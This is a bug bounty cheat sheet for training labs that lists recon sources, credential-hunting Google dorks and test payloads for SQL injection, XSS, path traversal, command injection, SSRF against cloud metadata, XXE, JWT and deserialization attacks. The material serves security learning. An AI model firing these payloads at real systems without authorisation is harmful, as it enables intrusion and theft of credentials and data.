# 🗂️ Bug Bounty Cheat Sheet

> **Print this or keep it open during labs!** Quick reference for payloads, tools, and techniques.

[← Back to Home](./README.md)

---

## 🔍 Reconnaissance

### Subdomain Enumeration

| Tool | URL | Example |
|------|-----|---------|
| **crt.sh** | [crt.sh](https://crt.sh) | Search `%.target.com` |
| **Shodan** | [shodan.io](https://shodan.io) | Search `hostname:target.com` |
| **SecurityTrails** | [securitytrails.com](https://securitytrails.com) | DNS history and subdomains |
| **Wayback Machine** | [web.archive.org](https://web.archive.org) | Old pages and endpoints |

### Google Dorks

| Dork | Purpose |
|------|---------|
| `site:target.com` | All indexed pages |
| `site:target.com filetype:pdf` | PDF documents |
| `site:target.com inurl:admin` | Admin pages |
| `site:target.com intitle:"index of"` | Directory listings |
| `site:target.com ext:log \| ext:conf` | Config/log files |
| `"target.com" password \| secret \| key` | Leaked credentials |
| `site:github.com "target.com"` | Code referencing target |

---

## 💉 SQL Injection

### Quick Test Payloads

| Payload | Purpose |
|---------|---------|
| `'` | Trigger an error (confirms SQLi) |
| `' OR 1=1 --` | Always-true condition |
| `' OR '1'='1` | Always-true (no comment needed) |
| `admin' --` | Login bypass |
| `' UNION SELECT NULL --` | Test UNION (add NULLs for columns) |
| `' ORDER BY 1 --` | Find number of columns |

### UNION Attack Steps

```
1. Find column count:     ' ORDER BY 1--  then 2-- then 3-- ...
2. Confirm with UNION:    ' UNION SELECT NULL,NULL,NULL--
3. Find string column:    ' UNION SELECT 'a',NULL,NULL--
4. Extract data:          ' UNION SELECT username,password,NULL FROM users--
```

### Useful Links
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 📜 Cross-Site Scripting (XSS)

### Test Payloads

| Payload | When to Use |
|---------|------------|
| `<script>alert(1)</script>` | Classic — try first |
| `<img src=x onerror=alert(1)>` | When `<script>` is blocked |
| `<svg onload=alert(1)>` | Another bypass |
| `"><script>alert(1)</script>` | Break out of an attribute |
| `' onmouseover='alert(1)` | Event handler injection |
| `javascript:alert(1)` | In `href` attributes |

### XSS Type Quick ID

| Type | Where's the payload? | Persists? |
|------|---------------------|-----------|
| **Reflected** | In the URL/request | No — victim clicks a link |
| **Stored** | In the database | Yes — affects all visitors |
| **DOM-based** | In client-side JS | No — never touches server |

### Useful Links
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

## 📁 Directory Traversal

### Payloads

| Payload | Target |
|---------|--------|
| `../../../etc/passwd` | Linux password file |
| `..\..\..\..\windows\win.ini` | Windows system file |
| `....//....//....//etc/passwd` | Bypass `../` stripping |
| `%2e%2e%2f%2e%2e%2f` | URL-encoded traversal |
| `..%252f..%252f..%252f` | Double URL-encoded |
| `/etc/passwd%00.jpg` | Null byte bypass (older systems) |

---

## ⌨️ Command Injection

### Operators

| Operator | Meaning |
|----------|---------|
| `;` | Run next command regardless |
| `\|` | Pipe output to next command |
| `&&` | Run next only if first succeeds |
| `\|\|` | Run next only if first fails |
| `$()` | Execute inside first |
| `` ` `` | Execute inside backticks first |

### Useful Commands to Run

| Command | What It Does |
|---------|-------------|
| `whoami` | Current user |
| `id` | User ID and groups |
| `cat /etc/passwd` | List system users |
| `ls -la` | List files in current directory |
| `env` | Show environment variables |
| `ifconfig` / `ip addr` | Network information |

---

## 🔄 SSRF (Server-Side Request Forgery)

### Common Targets

| URL | Purpose |
|-----|---------|
| `http://localhost/admin` | Local admin panels |
| `http://127.0.0.1:PORT` | Services on same machine |
| `http://192.168.0.X` | Internal network scan |
| `http://169.254.169.254/latest/meta-data/` | AWS metadata |
| `http://metadata.google.internal/` | GCP metadata |
| `http://[::1]/` | IPv6 localhost bypass |

### Bypass Techniques

| Technique | Example |
|-----------|---------|
| Decimal IP | `http://2130706433` (= 127.0.0.1) |
| Short IP | `http://127.1` |
| DNS rebinding | Point your domain to 127.0.0.1 |
| URL encoding | `http://127.0.0.1%23@evil.com` |

---

## 📄 XXE (XML External Entity)

### Key Concepts

```
1. Define DOCTYPE with ENTITY pointing to a file or URL
2. Reference the entity in your XML data
3. The server's XML parser fetches and includes the content
```

### Useful Entity Targets

| Target | Purpose |
|--------|---------|
| `file:///etc/passwd` | Read local files (Linux) |
| `file:///c:/windows/win.ini` | Read local files (Windows) |
| `http://internal-server/` | SSRF via XXE |
| `http://169.254.169.254/` | Cloud metadata via XXE |

> 📖 Full payload examples: [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe)

---

## 🔑 IDOR (Insecure Direct Object Reference)

### Where to Look

| Location | Example |
|----------|---------|
| URL path | `/api/users/123/profile` |
| Query params | `?id=123&action=view` |
| POST body | `{"userId": 123}` |
| Cookies | `user_id=123` |
| Headers | `X-User-Id: 123` |

### What to Try

1. **Increment/decrement IDs** — 123 → 124, 122
2. **Try other users' UUIDs** if you can find them
3. **Change HTTP method** — GET blocked? Try PUT, DELETE, PATCH
4. **Check response body** even if the page looks the same
5. **Swap IDs between accounts** if you have two test accounts

---

## 🎫 JWT (JSON Web Token)

### Structure
```
header.payload.signature
   ↓       ↓        ↓
Base64  Base64   Crypto
```

### Common Attacks

| Attack | How |
|--------|-----|
| **Unverified signature** | Modify payload, server doesn't check signature |
| **`alg: "none"`** | Remove signature verification entirely |
| **Weak secret** | Brute-force with tools like `hashcat` |
| **Key confusion** | Switch RS256 → HS256, sign with public key |

### Tools

| Tool | URL |
|------|-----|
| **jwt.io** | [jwt.io](https://jwt.io) — Decode and inspect |
| **CyberChef** | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) — Base64 encode/decode |

---

## 📦 Deserialization

### PHP Serialized Format

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
  ↓                                                      ↓
Object of                                          admin = false
class "User"                                    Change to b:1; !
```

### Quick Steps
1. Find serialized data (usually in cookies, Base64 encoded)
2. Decode with CyberChef (From Base64)
3. Modify the values
4. Re-encode (To Base64)
5. Replace the cookie

---

## 📝 WordPress

### Quick Checks

| Check | URL/Method |
|-------|-----------|
| Version | View source → `<meta name="generator">` |
| Login page | `/wp-admin` or `/wp-login.php` |
| User enumeration | `/?author=1`, `/?author=2` |
| Exposed files | `/readme.html`, `/wp-config.php.bak` |
| Plugins | `/wp-content/plugins/` |
| XML-RPC | `/xmlrpc.php` |
| REST API | `/wp-json/wp/v2/users` |

### Tools
- [WPScan](https://wpscan.com) — Vulnerability scanner
- [WPSec](https://wpsec.com) — Quick online check

---

## 🛠️ Essential Tools (All Free)

| Tool | Purpose | URL |
|------|---------|-----|
| **Browser DevTools** | Inspect requests, cookies, DOM | F12 |
| **CyberChef** | Encode/decode anything | [Link](https://gchq.github.io/CyberChef) |
| **jwt.io** | JWT decoder | [Link](https://jwt.io) |
| **crt.sh** | Subdomain finder | [Link](https://crt.sh) |
| **Shodan** | Device search engine | [Link](https://shodan.io) |
| **Wayback Machine** | Old website versions | [Link](https://web.archive.org) |
| **PortSwigger Academy** | Labs and learning | [Link](https://portswigger.net/web-security) |

---

## 🧠 Quick Methodology

```
1. RECON        → Find subdomains, endpoints, technologies
2. MAP          → Understand the application (login, APIs, file uploads)
3. TEST         → Try each vulnerability type on every input
4. DOCUMENT     → Screenshot everything, note HTTP requests
5. REPORT       → Write a clear, reproducible bug report
6. REPEAT       → Move to the next target or dig deeper
```

---

<p align="center">
  <a href="./README.md"><b>← Back to Home</b></a>
</p>
